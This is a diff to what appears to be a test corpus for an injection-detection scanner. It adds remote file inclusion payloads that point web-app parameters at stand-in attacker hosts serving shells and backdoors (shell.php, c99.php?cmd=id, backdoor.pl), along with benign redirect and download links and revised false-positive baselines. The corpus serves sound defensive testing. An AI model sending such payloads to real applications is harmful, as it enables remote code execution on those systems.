@@ -108,6 +108,20 @@ _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON = (
     "the control case the new pins are symmetric with"
 )
 
+_RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON = (
+    "the dedicated RFI file_inclusion pattern flags any param-value "
+    "delivery of an explicit http(s)/ftp URL whose final path segment ends "
+    "in one of the RFI executable/includable target extensions; a genuine "
+    "raw-doc download link (README.txt, readme.txt, terms.txt) and a "
+    "genuine curl-pipe installer or legacy cgi-bin link (install.sh, "
+    "search.cgi) are character-identical to that param=scheme://host/"
+    "path.ext RFI payload shape and cannot be told apart by extension "
+    "alone; an app that legitimately serves such download or installer "
+    "links needs route-level allowlisting, not a narrower pattern that "
+    "would lose recall on the backdoor.txt/backdoor.pl-shaped payloads "
+    "this pattern was built to catch"
+)
+
 MALICIOUS_CORPUS: list[MaliciousCase] = [
     MaliciousCase("xss_basic_script_alert", "xss", "<script>alert(1)</script>"),
     MaliciousCase(
@@ -362,6 +376,46 @@ MALICIOUS_CORPUS: list[MaliciousCase] = [
         "file_inclusion_protocol_relative_src",
         "file_inclusion",
         "src=//evil.io/malicious.js",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_http_domain_shell_php",
+        "file_inclusion",
+        "?page=http://attacker.com/shell.php",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_https_domain_backdoor_txt",
+        "file_inclusion",
+        "?file=https://evil.example/backdoor.txt",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_ftp_domain_inc_phtml",
+        "file_inclusion",
+        "?template=ftp://evil/inc.phtml",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_http_ipv4_query_string",
+        "file_inclusion",
+        "?include=http://198.51.100.7/c99.php?cmd=id",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_https_domain_shell_asp",
+        "file_inclusion",
+        "?page=https://evil.example.com/shell.asp",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_http_domain_webshell_jsp",
+        "file_inclusion",
+        "?file=http://malicious-host.example/webshell.jsp",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_http_domain_backdoor_pl",
+        "file_inclusion",
+        "?exec=http://attacker.net/backdoor.pl",
+    ),
+    MaliciousCase(
+        "file_inclusion_rfi_https_domain_payload_phar",
+        "file_inclusion",
+        "?load=https://evil.io/payload.phar",
     ),
     MaliciousCase("ldap_wildcard_or_filter", "ldap", "(|(uid=*)(cn=*))"),
     MaliciousCase("ldap_wildcard_equals", "ldap", "cn=*)(uid=*"),
@@ -1149,6 +1203,61 @@ BENIGN_CORPUS: list[BenignCase] = [
     ),
     BenignCase("file_inclusion_ipv6_literal_url", "https://[2001:db8::1]/path"),
     BenignCase("file_inclusion_ftp_url", "ftp://ftp.example.com/pub/file.txt"),
+    BenignCase(
+        "file_inclusion_redirect_uri_callback",
+        "redirect_uri=https://myapp.com/callback",
+    ),
+    BenignCase("file_inclusion_next_dashboard", "next=https://example.com/dashboard"),
+    BenignCase("file_inclusion_url_cdn_asset", "url=https://cdn.example.com/asset.js"),
+    BenignCase("file_inclusion_return_home", "return=https://example.com/home"),
+    BenignCase(
+        "file_inclusion_returnto_profile",
+        "returnTo=https://app.example.com/profile",
+    ),
+    BenignCase(
+        "file_inclusion_continue_checkout",
+        "continue=https://shop.example.com/checkout",
+    ),
+    BenignCase(
+        "file_inclusion_callback_oauth",
+        "callback=https://auth.example.com/oauth/complete",
+    ),
+    BenignCase(
+        "file_inclusion_benign_readme_txt_link",
+        "download=https://raw.githubusercontent.com/user/repo/main/README.txt",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "file_inclusion_benign_docs_readme_txt_link",
+        "return=https://example.com/docs/readme.txt",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "file_inclusion_benign_terms_txt_link",
+        "file=https://example.com/legal/terms.txt",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "file_inclusion_benign_installer_sh_link",
+        "url=https://example.com/install.sh",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "file_inclusion_benign_docker_installer_sh_link",
+        "url=https://get.docker.com/install.sh",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
+    BenignCase(
+        "file_inclusion_benign_cgi_search_link",
+        "url=https://legacy.example.com/cgi-bin/search.cgi",
+        "production",
+        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
+    ),
     BenignCase(
         "ldap_prose_wildcard_search_mention",
         "Use an asterisk wildcard in your search query to match partial names.",
@@ -2047,8 +2156,11 @@ BASELINE_MALICIOUS_DETECTED_BY_CATEGORY: dict[str, int] = {
 }
 BASELINE_MALICIOUS_DETECTED_TOTAL = 217
 
-BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY: dict[str, int] = {"cmd_injection": 9}
-BASELINE_BENIGN_FALSE_POSITIVE_TOTAL = 9
+BASELINE_BENIGN_FALSE_POSITIVE_BY_CATEGORY: dict[str, int] = {
+    "cmd_injection": 9,
+    "file_inclusion": 6,
+}
+BASELINE_BENIGN_FALSE_POSITIVE_TOTAL = 15
 
 _WALL_TIME_CEILING_SECONDS = 30.0
 
